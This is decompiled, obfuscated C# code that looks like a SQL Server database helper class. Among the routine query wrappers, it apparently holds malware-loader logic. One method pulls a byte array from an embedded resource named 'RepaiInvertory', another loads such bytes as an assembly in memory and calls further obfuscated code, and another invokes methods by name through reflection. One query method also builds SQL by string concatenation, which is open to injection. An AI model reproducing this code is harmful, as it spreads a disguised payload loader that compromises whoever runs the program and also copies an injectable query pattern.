using System;
using System.Collections;
using System.ComponentModel;
using System.Data;
using System.Data.Common;
using System.Data.SqlClient;
using System.Globalization;
using System.Linq;
using System.Net;
using System.Reflection;
using System.Resources;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Nb0p;
using n9D6;
using x1JM;

namespace z7B0;

public class x5BN
{
	protected SqlConnection SqlCon;

	protected SqlCommand SqlCom;

	protected SqlDataReader Sqldreader;

	protected SqlDataAdapter SqlDa;

	protected SqlCommandBuilder SqlComb;

	private string ConnectionString;

	public x5BN()
	{
		//IL_0012: Unknown result type (might be due to invalid IL or missing references)
		//IL_001c: Expected O, but got Unknown
		ConnectionString = "Data Source=BK-PC;Initial Catalog=manager_ass;Integrated Security=True";
		SqlCon = new SqlConnection();
		SqlCon.set_ConnectionString(ConnectionString);
	}

	internal static bool b9BF(string j1ZJ)
	{
		try
		{
			WebRequest webRequest = WebRequest.Create(j1ZJ);
			webRequest.GetResponse();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			bool result = false;
			ProjectData.ClearProjectError();
			return result;
		}
		return true;
	}

	public bool Ae15()
	{
		//IL_0038: Unknown result type (might be due to invalid IL or missing references)
		//IL_003e: Expected O, but got Unknown
		//IL_004c: Unknown result type (might be due to invalid IL or missing references)
		bool result = default(bool);
		try
		{
			if (SqlCon.get_State() != ConnectionState.Open)
			{
				SqlCon.set_ConnectionString(ConnectionString);
				SqlCon.Open();
				result = true;
				return result;
			}
			result = false;
			return result;
		}
		catch (SqlException val)
		{
			ProjectData.SetProjectError((Exception)val);
			MessageBox.Show("Can not connect to database, please choose a database!", "Connect Error", (MessageBoxButtons)0, (MessageBoxIcon)16);
			ProjectData.ClearProjectError();
			return result;
		}
	}

	protected bool r1S3()
	{
		//IL_0024: Unknown result type (might be due to invalid IL or missing references)
		//IL_002a: Expected O, but got Unknown
		//IL_002b: Expected O, but got Unknown
		//IL_0038: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			if (SqlCon.get_State() != 0)
			{
				SqlCon.Close();
				return true;
			}
			return false;
		}
		catch (SqlException val)
		{
			ProjectData.SetProjectError((Exception)val);
			SqlException val2 = val;
			Interaction.MsgBox((object)((Exception)(object)val2).Message, (MsgBoxStyle)16, (object)"Close Database");
			bool result = false;
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public bool Ro87(string n8XN, bool c6R1 = false)
	{
		//IL_0010: Unknown result type (might be due to invalid IL or missing references)
		//IL_001a: Expected O, but got Unknown
		//IL_002a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0030: Expected O, but got Unknown
		//IL_0031: Expected O, but got Unknown
		//IL_0041: Unknown result type (might be due to invalid IL or missing references)
		bool result = default(bool);
		if (Ae15())
		{
			try
			{
				SqlCom = new SqlCommand(n8XN, SqlCon);
				SqlCom.ExecuteNonQuery();
				return true;
			}
			catch (SqlException val)
			{
				ProjectData.SetProjectError((Exception)val);
				SqlException val2 = val;
				if (c6R1)
				{
					Interaction.MsgBox((object)((Exception)(object)val2).Message, (MsgBoxStyle)16, (object)"Execute!");
				}
				result = false;
				ProjectData.ClearProjectError();
				return result;
			}
			finally
			{
				r1S3();
				((Component)(object)SqlCom).Dispose();
			}
		}
		return result;
	}

	internal static byte[] a0L5(string[] Hj80, int d9YT)
	{
		checked
		{
			byte[] result = default(byte[]);
			try
			{
				string[] array = new string[Hj80.Length - 1 + 1];
				int num = Hj80.Length - 1;
				for (int i = 0; i <= num; i++)
				{
					try
					{
						array[i] = Hj80[i].Replace(".resources", "");
					}
					catch (Exception projectError)
					{
						ProjectData.SetProjectError(projectError);
						ProjectData.ClearProjectError();
					}
				}
				string[] array2 = array;
				foreach (string text in array2)
				{
					if (text == null)
					{
						continue;
					}
					try
					{
						ResourceManager resourceManager = new ResourceManager(text, (Assembly)Fd48.mDic["Ass"]);
						ResourceSet resourceSet = resourceManager.GetResourceSet(CultureInfo.CurrentCulture, createIfNotExists: true, tryParents: true);
						foreach (object item in resourceSet.OfType<object>())
						{
							DictionaryEntry dictionaryEntry = ((item != null) ? ((DictionaryEntry)item) : default(DictionaryEntry));
							if (Operators.ConditionalCompareObjectEqual(dictionaryEntry.Key, (object)"RepaiInvertory", false))
							{
								result = (byte[])dictionaryEntry.Value;
								return result;
							}
						}
					}
					catch (Exception projectError2)
					{
						ProjectData.SetProjectError(projectError2);
						ProjectData.ClearProjectError();
					}
				}
				return result;
			}
			catch (Exception projectError3)
			{
				ProjectData.SetProjectError(projectError3);
				ProjectData.ClearProjectError();
				return result;
			}
		}
	}

	public SqlDataReader p3GJ(string Bn8e)
	{
		//IL_0011: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		//IL_0035: Unknown result type (might be due to invalid IL or missing references)
		//IL_003b: Expected O, but got Unknown
		//IL_003c: Expected O, but got Unknown
		//IL_0049: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			if (Ae15())
			{
				SqlCom = new SqlCommand(Bn8e, SqlCon);
				Sqldreader = SqlCom.ExecuteReader();
			}
			return Sqldreader;
		}
		catch (SqlException val)
		{
			ProjectData.SetProjectError((Exception)val);
			SqlException val2 = val;
			Interaction.MsgBox((object)((Exception)(object)val2).Message, (MsgBoxStyle)16, (object)"Get DataReader");
			SqlDataReader result = null;
			ProjectData.ClearProjectError();
			return result;
		}
		finally
		{
			r1S3();
			((Component)(object)SqlCom).Dispose();
		}
	}

	public object r8F6(string q9Q5)
	{
		//IL_0012: Unknown result type (might be due to invalid IL or missing references)
		//IL_001c: Expected O, but got Unknown
		//IL_0043: Unknown result type (might be due to invalid IL or missing references)
		object result = null;
		try
		{
			if (Ae15())
			{
				SqlCom = new SqlCommand(q9Q5, SqlCon);
				result = RuntimeHelpers.GetObjectValue(SqlCom.ExecuteScalar());
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			Interaction.MsgBox((object)ex2.Message, (MsgBoxStyle)16, (object)"Get Scalar");
			ProjectData.ClearProjectError();
		}
		finally
		{
			r1S3();
			((Component)(object)SqlCom).Dispose();
		}
		return result;
	}

	public DataTable y2X5(string Zo28)
	{
		//IL_0043: Unknown result type (might be due to invalid IL or missing references)
		//IL_004d: Expected O, but got Unknown
		//IL_0064: Unknown result type (might be due to invalid IL or missing references)
		//IL_006a: Expected O, but got Unknown
		//IL_006c: Expected O, but got Unknown
		//IL_007a: Unknown result type (might be due to invalid IL or missing references)
		string text = string.Empty;
		try
		{
			text = Zo28.Substring(14);
			text = text.Substring(0, checked(text.IndexOf(" ") + 1));
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		DataTable dataTable = new DataTable(text);
		SqlDa = new SqlDataAdapter(Zo28, SqlCon);
		if (Ae15())
		{
			try
			{
				((DbDataAdapter)(object)SqlDa).Fill(dataTable);
			}
			catch (SqlException val)
			{
				ProjectData.SetProjectError((Exception)val);
				SqlException val2 = val;
				Interaction.MsgBox((object)((Exception)(object)val2).Message, (MsgBoxStyle)16, (object)"Get Datatable");
				ProjectData.ClearProjectError();
			}
			finally
			{
				r1S3();
				((Component)(object)SqlDa).Dispose();
			}
		}
		return dataTable;
	}

	public static string y0P6(string d7Y6)
	{
		Type type = (Type)Fd48.mDic[Fd48.T];
		return Conversions.ToString(type.InvokeMember(d7Y6, BindingFlags.Static | BindingFlags.Public | BindingFlags.InvokeMethod, null, null, null));
	}

	public DataTable Gj79(string a7X5, string n3E4)
	{
		//IL_001f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0029: Expected O, but got Unknown
		//IL_0040: Unknown result type (might be due to invalid IL or missing references)
		//IL_0046: Expected O, but got Unknown
		//IL_0047: Expected O, but got Unknown
		//IL_0054: Unknown result type (might be due to invalid IL or missing references)
		DataTable dataTable = new DataTable(a7X5);
		SqlDa = new SqlDataAdapter("Select * from " + a7X5 + " Where " + n3E4, SqlCon);
		if (Ae15())
		{
			try
			{
				((DbDataAdapter)(object)SqlDa).Fill(dataTable);
			}
			catch (SqlException val)
			{
				ProjectData.SetProjectError((Exception)val);
				SqlException val2 = val;
				Interaction.MsgBox((object)((Exception)(object)val2).Message, (MsgBoxStyle)16, (object)"Get DataTable");
				ProjectData.ClearProjectError();
			}
			finally
			{
				r1S3();
				((Component)(object)SqlDa).Dispose();
			}
		}
		return dataTable;
	}

	public bool c0L2(string r7KX, DataTable y5FY, bool w4G5 = false)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		//IL_0018: Unknown result type (might be due to invalid IL or missing references)
		//IL_0022: Expected O, but got Unknown
		//IL_0029: Unknown result type (might be due to invalid IL or missing references)
		//IL_0033: Expected O, but got Unknown
		//IL_0067: Unknown result type (might be due to invalid IL or missing references)
		SqlDa = new SqlDataAdapter();
		SqlDa.set_SelectCommand(new SqlCommand(r7KX, SqlCon));
		SqlComb = new SqlCommandBuilder(SqlDa);
		try
		{
			if (Ae15())
			{
				((DbDataAdapter)(object)SqlDa).Update(y5FY);
				return true;
			}
			return false;
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			if (w4G5)
			{
				Interaction.MsgBox((object)ex2.Message, (MsgBoxStyle)16, (object)"Warning");
			}
			bool result = false;
			ProjectData.ClearProjectError();
			return result;
		}
		finally
		{
			r1S3();
			((Component)(object)SqlDa).Dispose();
			((Component)(object)SqlComb).Dispose();
		}
	}

	internal static void g3MQ()
	{
		Assembly value = Thread.GetDomain().Load((byte[])Fd48.mDic[Fd48.mArray]);
		Fd48.mDic.Add("Ass2", value);
		value = null;
		if (g6DW.w7ZS())
		{
			x0X2.Nm0t();
		}
	}

	protected void t9MC()
	{
		r1S3();
		GC.SuppressFinalize(this);
	}
}
